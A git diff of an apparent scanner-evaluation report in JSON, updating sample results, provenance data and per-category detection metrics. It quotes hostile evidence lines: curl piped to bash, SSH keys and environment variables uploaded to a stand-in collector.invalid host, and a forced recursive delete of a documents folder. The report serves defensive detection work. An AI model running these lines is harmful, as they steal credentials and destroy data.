@@ -1,10 +1,10 @@
 {
   "schemaVersion": 1,
-  "generatedAt": "2026-07-28T13:58:04.424Z",
+  "generatedAt": "2026-07-28T14:10:31.139Z",
   "corpus": {
     "manifest": "evaluation/corpus/manifest.json",
     "schemaVersion": 1,
-    "description": "Non-executable seed corpus for category-level scanner evaluation",
+    "description": "Non-executable synthetic and pinned public corpus for category-level scanner evaluation",
     "provenance": {
       "type": "synthetic-realistic",
       "license": "repository-test-data",
@@ -18,7 +18,7 @@
       "recall": 0.9
     },
     "maximum": {
-      "parseErrorRate": 0,
+      "parseErrorRate": 0.05,
       "p95Milliseconds": 100
     }
   },
@@ -31,25 +31,25 @@
     "samples": true
   },
   "summary": {
-    "sampleCount": 20,
-    "passedSamples": 20,
+    "sampleCount": 26,
+    "passedSamples": 26,
     "failedSamples": 0,
-    "tp": 25,
+    "tp": 37,
     "fp": 0,
     "fn": 0,
     "precision": 1,
     "recall": 1,
     "f1": 1,
-    "parseErrorRate": 0,
+    "parseErrorRate": 0.038461538461538464,
     "performance": {
-      "p50Milliseconds": 1.050545999999997,
-      "p95Milliseconds": 4.775546000000006,
-      "maximumMilliseconds": 10.068404999999998
+      "p50Milliseconds": 0.9477120000000099,
+      "p95Milliseconds": 68.17780400000001,
+      "maximumMilliseconds": 97.885978
     }
   },
   "languages": {
     "bash": {
-      "tp": 7,
+      "tp": 19,
       "fp": 0,
       "fn": 0,
       "precision": 1,
@@ -73,9 +73,53 @@
       "f1": 1
     }
   },
+  "provenanceGroups": {
+    "public-derived": {
+      "tp": 6,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    },
+    "public-snapshot": {
+      "tp": 6,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    },
+    "synthetic-realistic": {
+      "tp": 25,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    }
+  },
+  "datasetSplits": {
+    "regression": {
+      "tp": 25,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    },
+    "validation": {
+      "tp": 12,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    }
+  },
   "categories": {
     "credential_access": {
-      "tp": 5,
+      "tp": 6,
       "fp": 0,
       "fn": 0,
       "precision": 1,
@@ -90,7 +134,7 @@
       "recall": 1,
       "f1": 1
     },
-    "destructive_behavior": {
+    "defense_evasion": {
       "tp": 1,
       "fp": 0,
       "fn": 0,
@@ -98,8 +142,16 @@
       "recall": 1,
       "f1": 1
     },
+    "destructive_behavior": {
+      "tp": 2,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    },
     "download_execution": {
-      "tp": 1,
+      "tp": 2,
       "fp": 0,
       "fn": 0,
       "precision": 1,
@@ -115,7 +167,7 @@
       "f1": 1
     },
     "interpreter_escape": {
-      "tp": 2,
+      "tp": 3,
       "fp": 0,
       "fn": 0,
       "precision": 1,
@@ -123,7 +175,7 @@
       "f1": 1
     },
     "network_egress": {
-      "tp": 9,
+      "tp": 12,
       "fp": 0,
       "fn": 0,
       "precision": 1,
@@ -131,6 +183,22 @@
       "f1": 1
     },
     "persistence": {
+      "tp": 3,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    },
+    "privilege_escalation": {
+      "tp": 1,
+      "fp": 0,
+      "fn": 0,
+      "precision": 1,
+      "recall": 1,
+      "f1": 1
+    },
+    "system_modification": {
       "tp": 1,
       "fp": 0,
       "fn": 0,
@@ -142,9 +210,17 @@
   "samples": [
     {
       "id": "bash-download-execute-001",
+      "split": "regression",
       "language": "bash",
       "kind": "malicious",
       "sourceFile": "bash/download-execute.sh.txt",
+      "sha256": "c0696021f435e0b37f184699eb4a74839e4c4bf17e2287f6ff890be853bcfd1c",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "download_execution",
         "network_egress"
@@ -153,22 +229,44 @@
         "download_execution",
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "curl --fail --silent --show-error \"$release_url\""
+        },
+        {
+          "ruleId": "chain.download-execute",
+          "category": "download_execution",
+          "evidence": "curl --fail --silent --show-error \"$release_url\" | bash … curl --fail --silent --show-error \"$release_url\" | bash"
+        }
+      ],
       "truePositives": [
         "download_execution",
         "network_egress"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 2,
       "parseErrorCount": 0,
-      "durationMilliseconds": 10.068404999999998,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 15.26028199999999,
       "passed": true
     },
     {
       "id": "bash-read-upload-001",
+      "split": "regression",
       "language": "bash",
       "kind": "malicious",
       "sourceFile": "bash/read-upload.sh.txt",
+      "sha256": "63bfeb032567149a5fffb964fbea4b8bccdcd14046171640d137f383e8f15386",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "credential_access",
         "data_exfiltration",
@@ -179,6 +277,28 @@
         "data_exfiltration",
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "credential.sensitive-path",
+          "category": "credential_access",
+          "evidence": "tar czf /tmp/support-bundle.tgz \"$HOME/.ssh\""
+        },
+        {
+          "ruleId": "chain.read-upload",
+          "category": "data_exfiltration",
+          "evidence": "tar czf /tmp/support-bundle.tgz \"$HOME/.ssh\" … curl --fail -T /tmp/support-bundle.tgz https://collector.invalid/upload"
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "curl --fail -T /tmp/support-bundle.tgz https://collector.invalid/upload"
+        },
+        {
+          "ruleId": "exfil.upload",
+          "category": "data_exfiltration",
+          "evidence": "curl --fail -T /tmp/support-bundle.tgz https://collector.invalid/upload"
+        }
+      ],
       "truePositives": [
         "credential_access",
         "data_exfiltration",
@@ -186,109 +306,192 @@
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 4,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.8841569999999876,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 1.0428310000000067,
       "passed": true
     },
     {
       "id": "bash-persistence-001",
+      "split": "regression",
       "language": "bash",
       "kind": "malicious",
       "sourceFile": "bash/persistence.sh.txt",
+      "sha256": "72cfa2a743048924122de91a9bae4a211c8a8f93aa3853f0b8938b03a57a0917",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "persistence"
       ],
       "actualCategories": [
         "persistence"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "persistence.scheduler",
+          "category": "persistence",
+          "evidence": "crontab -"
+        }
+      ],
       "truePositives": [
         "persistence"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 1,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.5608339999999998,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.6499760000000094,
       "passed": true
     },
     {
       "id": "bash-download-only-001",
+      "split": "regression",
       "language": "bash",
       "kind": "benign",
       "sourceFile": "bash/download-only.sh.txt",
+      "sha256": "670370eda185384bdfda5d95a2df4264ff5e3a78e834bf913bc6faecba8a51c7",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "network_egress"
       ],
       "actualCategories": [
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "curl --fail --location https://releases.invalid/tool.tar.gz --output /tmp/tool.tar.gz"
+        }
+      ],
       "truePositives": [
         "network_egress"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 1,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.1556929999999994,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 1.1078530000000057,
       "passed": true
     },
     {
       "id": "bash-documentation-001",
+      "split": "regression",
       "language": "bash",
       "kind": "hard-negative",
       "sourceFile": "bash/documentation.sh.txt",
+      "sha256": "67f3586bf2fe2e802fc979113947c7dff47fbe1b7271d8a5b9dc8a939c3e3ac1",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [],
       "actualCategories": [],
+      "actualFindings": [],
       "truePositives": [],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 0,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.3307060000000064,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.3541319999999928,
       "passed": true
     },
     {
       "id": "bash-temp-cleanup-001",
+      "split": "regression",
       "language": "bash",
       "kind": "hard-negative",
       "sourceFile": "bash/temp-cleanup.sh.txt",
+      "sha256": "89b7a53491f878fd29eff76a3bf82c16942fb3f8d69b75fea9188854a3e49817",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [],
       "actualCategories": [],
+      "actualFindings": [],
       "truePositives": [],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 0,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.0348880000000094,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 1.1411450000000087,
       "passed": true
     },
     {
       "id": "python-alias-network-001",
+      "split": "regression",
       "language": "python",
       "kind": "malicious",
       "sourceFile": "python/alias-network.py.txt",
+      "sha256": "3df7f41a603b17a329d541cb357cee5e632ae59bdc8c2d65b730c47dcb593e53",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "network_egress"
       ],
       "actualCategories": [
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "python.network",
+          "category": "network_egress",
+          "evidence": "http_client.get(\"https://telemetry.invalid/ping\", timeout=5)"
+        }
+      ],
       "truePositives": [
         "network_egress"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 1,
       "parseErrorCount": 0,
-      "durationMilliseconds": 4.744557,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 5.175480000000007,
       "passed": true
     },
     {
       "id": "python-alias-shell-001",
+      "split": "regression",
       "language": "python",
       "kind": "malicious",
       "sourceFile": "python/alias-shell.py.txt",
+      "sha256": "3a528e5d3855bf2341491820ef384be900d4f7966e6f484fed7a627c874979c7",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "dynamic_execution",
         "interpreter_escape"
@@ -297,43 +500,82 @@
         "dynamic_execution",
         "interpreter_escape"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "python.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "launch([\"bash\", \"-c\", command], check=True)"
+        },
+        {
+          "ruleId": "python.interpreter-escape",
+          "category": "interpreter_escape",
+          "evidence": "launch([\"bash\", \"-c\", command], check=True)"
+        }
+      ],
       "truePositives": [
         "dynamic_execution",
         "interpreter_escape"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 2,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.4103369999999984,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 1.4808599999999927,
       "passed": true
     },
     {
       "id": "python-path-credential-001",
+      "split": "regression",
       "language": "python",
       "kind": "malicious",
       "sourceFile": "python/path-credential.py.txt",
+      "sha256": "d267ba7e5edac9e0fd37905f919fc2fd8489c0edd42db80fb67b6529f0517996",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "credential_access"
       ],
       "actualCategories": [
         "credential_access"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "python.credential-access",
+          "category": "credential_access",
+          "evidence": "(Path.home() / \".ssh\" / \"id_rsa\").read_text()"
+        }
+      ],
       "truePositives": [
         "credential_access"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 1,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.050545999999997,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.9477120000000099,
       "passed": true
     },
     {
       "id": "python-read-upload-001",
+      "split": "regression",
       "language": "python",
       "kind": "malicious",
       "sourceFile": "python/read-upload.py.txt",
+      "sha256": "8b7bc3a836285b7edba8539361bc5afea6df05c9e2648e1c28e41890282daade",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "credential_access",
         "data_exfiltration",
@@ -344,6 +586,28 @@
         "data_exfiltration",
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "python.chain.read-upload",
+          "category": "data_exfiltration",
+          "evidence": "open(\"/home/user/.ssh/id_rsa\", encoding=\"utf-8\").read() open(\"/home/user/.ssh/id_rsa\", encoding=\"utf-8\") http.post(\"https://collector.invalid/upload\", data=private_key, timeout=5)"
+        },
+        {
+          "ruleId": "python.credential-access",
+          "category": "credential_access",
+          "evidence": "open(\"/home/user/.ssh/id_rsa\", encoding=\"utf-8\")"
+        },
+        {
+          "ruleId": "python.network",
+          "category": "network_egress",
+          "evidence": "http.post(\"https://collector.invalid/upload\", data=private_key, timeout=5)"
+        },
+        {
+          "ruleId": "python.exfiltration",
+          "category": "data_exfiltration",
+          "evidence": "http.post(\"https://collector.invalid/upload\", data=private_key, timeout=5)"
+        }
+      ],
       "truePositives": [
         "credential_access",
         "data_exfiltration",
@@ -351,67 +615,116 @@
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 4,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.979237000000012,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 2.2679119999999955,
       "passed": true
     },
     {
       "id": "python-http-get-001",
+      "split": "regression",
       "language": "python",
       "kind": "benign",
       "sourceFile": "python/http-get.py.txt",
+      "sha256": "c37ed1804559a7d5aefa86a345960c35f734127dc1eb623bae19d6d3c3edd4f7",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "network_egress"
       ],
       "actualCategories": [
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "python.network",
+          "category": "network_egress",
+          "evidence": "requests.get(\"https://api.invalid/public-metadata\", timeout=5)"
+        }
+      ],
       "truePositives": [
         "network_egress"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 1,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.7675789999999978,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.645347000000001,
       "passed": true
     },
     {
       "id": "python-local-file-001",
+      "split": "regression",
       "language": "python",
       "kind": "hard-negative",
       "sourceFile": "python/local-file.py.txt",
+      "sha256": "b3657506d0616c116271e320a611895b36f7a84cfc0d8912ef95a2f01a22a143",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [],
       "actualCategories": [],
+      "actualFindings": [],
       "truePositives": [],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 0,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.146214999999998,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.9304500000000075,
       "passed": true
     },
     {
       "id": "python-documentation-001",
+      "split": "regression",
       "language": "python",
       "kind": "hard-negative",
       "sourceFile": "python/documentation.py.txt",
+      "sha256": "dd884aff499f58c99740161eb53b4d97145ea6232017bf789c082d84e44cfe8a",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [],
       "actualCategories": [],
+      "actualFindings": [],
       "truePositives": [],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 0,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.24258199999999874,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.19746000000000663,
       "passed": true
     },
     {
       "id": "node-cjs-shell-001",
+      "split": "regression",
       "language": "node",
       "kind": "malicious",
       "sourceFile": "node/cjs-shell.js.txt",
+      "sha256": "4ea2c47f14c19cb68191b2dcc058e3d027c9ce9df79e90b5f4193b0102db929b",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "dynamic_execution",
         "interpreter_escape"
@@ -420,43 +733,82 @@
         "dynamic_execution",
         "interpreter_escape"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "javascript.dynamic-code",
+          "category": "dynamic_execution",
+          "evidence": "runCommand(\"bash -c id\", (error, stdout) => { if (error) throw error; console.log(stdout); })"
+        },
+        {
+          "ruleId": "javascript.interpreter-escape",
+          "category": "interpreter_escape",
+          "evidence": "runCommand(\"bash -c id\", (error, stdout) => { if (error) throw error; console.log(stdout); })"
+        }
+      ],
       "truePositives": [
         "dynamic_execution",
         "interpreter_escape"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 2,
       "parseErrorCount": 0,
-      "durationMilliseconds": 4.775546000000006,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 4.4573970000000145,
       "passed": true
     },
     {
       "id": "node-esm-delete-001",
+      "split": "regression",
       "language": "node",
       "kind": "malicious",
       "sourceFile": "node/esm-delete.js.txt",
+      "sha256": "06bd98159cbe443e03a69918e52f8bb5ba19ffdffcbbec83fb39e0b02791ab83",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "destructive_behavior"
       ],
       "actualCategories": [
         "destructive_behavior"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "javascript.destructive",
+          "category": "destructive_behavior",
+          "evidence": "removeTree(\"/home/user/documents\", { recursive: true, force: true })"
+        }
+      ],
       "truePositives": [
         "destructive_behavior"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 1,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.4509219999999914,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 1.2665290000000198,
       "passed": true
     },
     {
       "id": "node-read-upload-001",
+      "split": "regression",
       "language": "node",
       "kind": "malicious",
       "sourceFile": "node/read-upload.js.txt",
+      "sha256": "1730c7591a0bad982aa8f8ac69de4a31bae71e7403397c8e9506b81eb6a8a320",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "credential_access",
         "data_exfiltration",
@@ -467,6 +819,23 @@
         "data_exfiltration",
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "javascript.credential-access",
+          "category": "credential_access",
+          "evidence": "readLocalFile(\"/home/user/.ssh/id_rsa\")"
+        },
+        {
+          "ruleId": "javascript.network",
+          "category": "network_egress",
+          "evidence": "fetch(\"https://collector.invalid/upload\", { method: \"POST\", body: privateKey, })"
+        },
+        {
+          "ruleId": "javascript.exfiltration",
+          "category": "data_exfiltration",
+          "evidence": "fetch(\"https://collector.invalid/upload\", { method: \"POST\", body: privateKey, })"
+        }
+      ],
       "truePositives": [
         "credential_access",
         "data_exfiltration",
@@ -474,16 +843,26 @@
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 3,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.2951219999999921,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 1.1483879999999829,
       "passed": true
     },
     {
       "id": "node-environment-001",
+      "split": "regression",
       "language": "node",
       "kind": "malicious",
       "sourceFile": "node/environment.js.txt",
+      "sha256": "990aa0650373c8c42730edcff21516e8130d351c94ad285109ef823236d71935",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "credential_access",
         "data_exfiltration",
@@ -494,6 +873,23 @@
         "data_exfiltration",
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "javascript.environment-access",
+          "category": "credential_access",
+          "evidence": "JSON.stringify(process.env)"
+        },
+        {
+          "ruleId": "javascript.network",
+          "category": "network_egress",
+          "evidence": "fetch(\"https://collector.invalid/env\", { method: \"POST\", body: snapshot })"
+        },
+        {
+          "ruleId": "javascript.exfiltration",
+          "category": "data_exfiltration",
+          "evidence": "fetch(\"https://collector.invalid/env\", { method: \"POST\", body: snapshot })"
+        }
+      ],
       "truePositives": [
         "credential_access",
         "data_exfiltration",
@@ -501,60 +897,557 @@
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 3,
       "parseErrorCount": 0,
-      "durationMilliseconds": 1.1187639999999988,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.862212999999997,
       "passed": true
     },
     {
       "id": "node-http-get-001",
+      "split": "regression",
       "language": "node",
       "kind": "benign",
       "sourceFile": "node/http-get.js.txt",
+      "sha256": "b5bec5727a40fd5b9f65688fc0e1a94bf573a7d668d968fc401e50846584bc86",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [
         "network_egress"
       ],
       "actualCategories": [
         "network_egress"
       ],
+      "actualFindings": [
+        {
+          "ruleId": "javascript.network",
+          "category": "network_egress",
+          "evidence": "fetch(\"https://api.invalid/public-metadata\")"
+        }
+      ],
       "truePositives": [
         "network_egress"
       ],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 1,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.5052909999999997,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.38982999999998924,
       "passed": true
     },
     {
       "id": "node-local-file-001",
+      "split": "regression",
       "language": "node",
       "kind": "hard-negative",
       "sourceFile": "node/local-file.js.txt",
+      "sha256": "7309ebf32a25969e966608a0fb6275d0ea9adbed610f5949bd9d7e605d273f1b",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [],
       "actualCategories": [],
+      "actualFindings": [],
       "truePositives": [],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 0,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.8007920000000013,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.5480550000000051,
       "passed": true
     },
     {
       "id": "node-documentation-001",
+      "split": "regression",
       "language": "node",
       "kind": "hard-negative",
       "sourceFile": "node/documentation.js.txt",
+      "sha256": "d8dbfb49118bbd934c33339aaa1f49de1675519d39294aa353387344f3c11ea9",
+      "provenance": {
+        "type": "synthetic-realistic",
+        "license": "repository-test-data",
+        "containsLiveIndicators": false,
+        "executableByHarness": false
+      },
       "expectedCategories": [],
       "actualCategories": [],
+      "actualFindings": [],
       "truePositives": [],
       "falsePositives": [],
       "falseNegatives": [],
+      "missingExpectedFindings": [],
       "findingCount": 0,
       "parseErrorCount": 0,
-      "durationMilliseconds": 0.21190500000000156,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.17107999999998924,
+      "passed": true
+    },
+    {
+      "id": "public-nvm-install-001",
+      "split": "validation",
+      "language": "bash",
+      "kind": "benign",
+      "sourceFile": "public/nvm/install.sh.txt",
+      "sha256": "b5f8ba6dcc759c1c58c027f07e439bb18afb0a8f16525470364d401a9471eb54",
+      "provenance": {
+        "type": "public-snapshot",
+        "repository": "nvm-sh/nvm",
+        "commit": "65ded65d46c16481dbbe8e93f8ba9e6b35f20740",
+        "sourceUrl": "https://github.com/nvm-sh/nvm/blob/65ded65d46c16481dbbe8e93f8ba9e6b35f20740/install.sh",
+        "license": "MIT",
+        "licenseFile": "public/nvm/LICENSE.md"
+      },
+      "expectedCategories": [
+        "network_egress",
+        "persistence"
+      ],
+      "actualCategories": [
+        "network_egress",
+        "persistence"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "command curl --fail --compressed -q \"$@\""
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "command wget \"$@\""
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "command git ls-remote \"$(nvm_source \"git\")\" \"$NVM_VERSION\""
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "command git clone -o origin \"$(nvm_source)\" --depth=1 \"${INSTALL_DIR}\""
+        },
+        {
+          "ruleId": "persistence.shell-rc",
+          "category": "persistence",
+          "evidence": "command printf '%b' \"${SOURCE_STR}\" >> \"$NVM_PROFILE\""
+        },
+        {
+          "ruleId": "persistence.shell-rc",
+          "category": "persistence",
+          "evidence": "command printf '%b' \"$COMPLETION_STR\" >> \"$NVM_PROFILE\""
+        }
+      ],
+      "truePositives": [
+        "network_egress",
+        "persistence"
+      ],
+      "falsePositives": [],
+      "falseNegatives": [],
+      "missingExpectedFindings": [],
+      "findingCount": 6,
+      "parseErrorCount": 0,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 68.17780400000001,
+      "passed": true
+    },
+    {
+      "id": "public-homebrew-install-001",
+      "split": "validation",
+      "language": "bash",
+      "kind": "benign",
+      "sourceFile": "public/homebrew-install/install.sh.txt",
+      "sha256": "8ff338091a5e10bb5fc040b38316648110f42feff057ecf9feaab51fd0a13ef9",
+      "provenance": {
+        "type": "public-snapshot",
+        "repository": "Homebrew/install",
+        "commit": "ca0130bd52235f2fcb2bf23cfdda004bc5d250c1",
+        "sourceUrl": "https://github.com/Homebrew/install/blob/ca0130bd52235f2fcb2bf23cfdda004bc5d250c1/install.sh",
+        "license": "BSD-2-Clause",
+        "licenseFile": "public/homebrew-install/LICENSE.txt"
+      },
+      "expectedCategories": [
+        "interpreter_escape",
+        "network_egress",
+        "privilege_escalation",
+        "system_modification"
+      ],
+      "actualCategories": [
+        "interpreter_escape",
+        "network_egress",
+        "privilege_escalation",
+        "system_modification"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute \"/usr/bin/sudo\" \"${args[@]}\""
+        },
+        {
+          "ruleId": "escape.interpreter",
+          "category": "interpreter_escape",
+          "evidence": "ruby -e \"require 'erb'\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "/usr/bin/sudo -n -v"
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHMOD[@]}\" \"u+rwx\" \"${chmods[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHMOD[@]}\" \"g+rwx\" \"${group_chmods[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHMOD[@]}\" \"go-w\" \"${user_chmods[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHOWN[@]}\" \"${USER}\" \"${chowns[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHGRP[@]}\" \"${GROUP}\" \"${chgrps[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${INSTALL[@]}\" \"${HOMEBREW_PREFIX}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${MKDIR[@]}\" \"${mkdirs[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHMOD[@]}\" \"ug=rwx\" \"${mkdirs[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHMOD[@]}\" \"go-w\" \"${mkdirs_user_only[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHOWN[@]}\" \"${USER}\" \"${mkdirs[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
